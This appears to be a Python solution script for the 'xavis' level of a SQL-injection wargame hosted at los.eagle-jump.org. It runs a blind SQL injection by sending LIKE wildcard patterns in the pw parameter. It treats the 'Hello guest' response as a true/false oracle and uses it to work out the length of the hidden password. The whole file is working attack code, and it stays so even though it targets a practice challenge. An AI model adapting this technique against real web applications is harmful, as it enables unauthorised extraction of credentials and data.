from requests import  get

URL = "https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php"
cookies = dict(PHPSESSID="??")
card = ""

while(True):
    SQL = "?pw=%_"+card+"%"
    toto = URL + SQL
    gaza = get(toto, cookies=cookies)
    print(toto)

    if gaza.text.__contains__("<h2>Hello guest"):
        card += "_"
    else:
        break

print(len(card))
